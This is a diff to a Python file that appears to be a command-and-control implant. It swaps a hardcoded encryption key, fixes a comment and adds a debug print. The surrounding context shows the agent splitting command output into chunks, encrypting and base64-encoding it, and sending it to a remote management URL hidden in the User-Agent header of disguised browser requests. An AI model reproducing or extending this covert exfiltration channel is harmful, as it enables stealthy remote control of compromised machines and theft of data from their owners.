@@ -36,7 +36,8 @@ encrypted = True
 BLOCK_SIZE = 32
 
 #---------------Change Me---------------#
-key = b'dRgUkXp2s5u8x/A?D(G+KbPeShVmYq3t'
+#-----------b'<32 length key>-----------#
+key = b'badbirdbadbirdbadbirdbadbirdbadb'
 #---------------------------------------#
 
 
@@ -292,7 +293,7 @@ def connect(url, managementURL):
 
         # If data will be sent in over 50 chunks, send warning that output cant be sent
         if len(split) >= 50:
-            # If output to soo large (over 50 chunks), let server know it's a nogo
+            # If output to soo large (over 50 chunks), let server know it's a no-go
             toolong = base64.b64encode("toolong:".encode('UTF-8'))
             toolong = encrypt(toolong)
             headers = {"User-Agent": toolong,
@@ -327,6 +328,7 @@ def connect(url, managementURL):
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                        "Upgrade-Insecure-Requests": "1"}
+            print("Sending:" + str(i))
             response = requests.get(url, headers=headers)
 
 
@@ -342,7 +344,6 @@ def connect(url, managementURL):
             # print("[+] Sending chunked data")
 
             if command != "task:" or command != "":
-                # print("sending response")
                 response = requests.get(url, headers=headers)
 
         except Exception as e:
